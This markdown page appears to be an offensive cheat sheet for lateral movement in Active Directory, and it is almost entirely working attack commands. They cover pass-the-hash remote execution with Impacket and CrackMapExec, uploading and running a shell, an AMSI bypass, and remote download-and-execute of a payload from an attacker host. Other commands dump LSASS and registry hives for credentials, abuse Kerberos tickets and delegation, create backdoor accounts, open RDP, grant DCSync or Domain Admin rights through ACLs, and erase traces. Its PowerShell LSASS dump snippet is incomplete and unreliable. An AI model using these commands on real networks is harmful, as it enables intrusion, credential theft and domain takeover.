---
title: "AD Lateral Movement"
---

# AD Lateral Movement

Lateral movement is the process of expanding access across systems once initial foothold is established. In AD environments, this means moving between hosts using legitimate protocols — SMB, WMI, WinRM, RDP — and leveraging credentials or tickets obtained along the way.

## Remote Code Execution Techniques

### PsExec (SMB)

Uploads a service binary and executes it — requires admin access:

```bash
# Impacket (from Kali)
psexec.py domain.local/administrator:password@<IP>
psexec.py domain.local/administrator@<IP> -hashes :NTLM_HASH
psexec.py domain.local/administrator@<IP> -hashes :NTLM_HASH "whoami"

# Creates a named pipe service — detectable but reliable
```

### WMIExec (WMI)

Executes via Windows Management Instrumentation — no service created:

```bash
# Impacket
wmiexec.py domain.local/administrator:password@<IP>
wmiexec.py domain.local/administrator@<IP> -hashes :NTLM_HASH
wmiexec.py domain.local/administrator@<IP> -hashes :NTLM_HASH "hostname"

# Non-interactive command
wmiexec.py domain.local/admin:password@<IP> -nooutput "net user hacker Password123 /add"
```

```powershell
# PowerShell WMI
$cred = New-Object System.Management.Automation.PSCredential("domain\admin", (ConvertTo-SecureString "password" -AsPlainText -Force))
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\output.txt" -ComputerName <target> -Credential $cred
```

### CrackMapExec Execution

```bash
# Execute command
crackmapexec smb <IP> -u administrator -p password -x "whoami"
crackmapexec smb <IP> -u administrator -H NTLM_HASH -x "net user"

# PowerShell execution
crackmapexec smb <IP> -u administrator -p password -X "Get-Process"

# File upload and execute
crackmapexec smb <IP> -u administrator -p password --put-file shell.exe C:\\Windows\\Temp\\shell.exe
crackmapexec smb <IP> -u administrator -p password -x "C:\\Windows\\Temp\\shell.exe"
```

### Evil-WinRM (WinRM / PowerShell Remoting)

WinRM runs on port 5985 (HTTP) and 5986 (HTTPS):

```bash
# Basic connection
evil-winrm -i <IP> -u administrator -p password
evil-winrm -i <IP> -u administrator -H NTLM_HASH

# With certificate
evil-winrm -i <IP> -c cert.pem -k key.pem -S

# Upload / download
# Inside session:
upload /kali/winpeas.exe C:\Windows\Temp\winpeas.exe
download C:\Windows\System32\SAM /kali/SAM

# Load PowerShell scripts
evil-winrm -i <IP> -u admin -p password -s /kali/scripts/

# Commands after connect:
menu  # Show available functions
Bypass-4MSI  # Load AMSI bypass
```

### SMBExec

Executes via service creation but doesn't upload a binary:

```bash
smbexec.py domain.local/administrator@<IP>
smbexec.py domain.local/administrator@<IP> -hashes :NTLM_HASH
```

### ATExec (Task Scheduler)

```bash
atexec.py domain.local/administrator:password@<IP> "whoami"
atexec.py domain.local/administrator@<IP> -hashes :NTLM_HASH "net user"
```

## PowerShell Remoting

```powershell
# Create credential
$pass = ConvertTo-SecureString "password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("domain\admin", $pass)

# Interactive session
Enter-PSSession -ComputerName <target> -Credential $cred

# Execute command on remote host
Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock { whoami }
Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock { Get-LocalGroup }

# Multiple targets
Invoke-Command -ComputerName host1,host2,host3 -Credential $cred -ScriptBlock { hostname }

# Execute script
Invoke-Command -ComputerName <target> -Credential $cred -FilePath .\script.ps1

# Download and execute remotely
Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock {
    IEX (New-Object Net.WebClient).DownloadString('http://KALI/payload.ps1')
}
```

## Credential Extraction

### LSASS Dump

```shell
# Via Task Manager (GUI) — right-click LSASS → Create Dump File

# ProcDump
procdump.exe -ma lsass.exe lsass.dmp

# Comsvcs.dll (built-in, no tools needed)
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full

# PowerShell
$process = Get-Process lsass
$stream = New-Object System.IO.FileStream("C:\Windows\Temp\lsass.dmp", [System.IO.FileMode]::Create)
$proc = [System.Runtime.InteropServices.Marshal]::ReadIntPtr([System.Diagnostics.Process]::GetCurrentProcess().Handle)
```

### Parse Dump on Kali

```bash
# Pypykatz
pypykatz lsa minidump lsass.dmp

# Mimikatz
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

### SAM + SYSTEM + SECURITY

```bash
# From compromised Windows (reg save)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY

# Extract hashes offline
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

## Moving via Tickets

### Forwardable Tickets

```shell
# Export all tickets
Rubeus.exe triage
Rubeus.exe dump /user:administrator /service:krbtgt /nowrap

# Import ticket
Rubeus.exe ptt /ticket:base64_here
klist

# Access remote host with ticket
dir \\remote_host\c$
psexec.py -k -no-pass domain.local/admin@target.domain.local
```

## RDP Lateral Movement

```bash
# Connect via RDP
xfreerdp /v:<IP> /u:administrator /p:password /d:domain.local
xfreerdp /v:<IP> /u:administrator /pth:NTLM_HASH /d:domain.local  # PTH via RDP

# Add RDP access (from compromised shell)
net localgroup "Remote Desktop Users" username /add
netsh advfirewall firewall add rule name="Open 3389" protocol=TCP dir=in localport=3389 action=allow
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

## Unconstrained Delegation Exploitation

Hosts with unconstrained delegation store TGTs of any user that authenticates to them.

```powershell
# Find unconstrained delegation hosts
Get-DomainComputer -Unconstrained | select name,dnshostname

# If we compromise the host, extract cached TGTs
Rubeus.exe triage
Rubeus.exe dump /user:administrator /service:krbtgt /nowrap

# Trigger authentication from high-value user
# Via printer bug (SpoolSample):
SpoolSample.exe <DC_FQDN> <compromised_host_FQDN>

# Monitor and capture:
Rubeus.exe monitor /interval:5 /nowrap
```

## Constrained Delegation Exploitation

If a service account has constrained delegation, it can request service tickets on behalf of any user.

```bash
# Find constrained delegation accounts
Get-DomainUser -TrustedToAuth | select name,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto

# S4U2Self + S4U2Proxy attack
Rubeus.exe s4u /user:svc_account /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:cifs/server.domain.local /ptt

# Or with ticket
Rubeus.exe s4u /ticket:base64_tgt /impersonateuser:administrator /msdsspn:cifs/server.domain.local /ptt
```

## Moving via ACL Misconfigurations

### GenericAll / FullControl

Full control over a user account allows setting a new password:

```powershell
# Set password without knowing current one
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force) -Verbose

# Add to group
Add-DomainGroupMember -Identity "Domain Admins" -Members targetuser -Verbose
```

### WriteDACL

Can modify the DACL to add permissions:

```powershell
# Add DCSync rights to a user
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity targetuser -Rights DCSync -Verbose
```

### ForceChangePassword

```powershell
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
```

## Cleanup After Movement

```shell
# Remove added user
net user hacker /delete
net localgroup administrators hacker /delete

# Remove firewall rule
netsh advfirewall firewall delete rule name="Open 3389"

# Re-disable RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f

# Remove dropped files
del C:\Windows\Temp\payload.exe
del C:\Windows\Temp\lsass.dmp
```
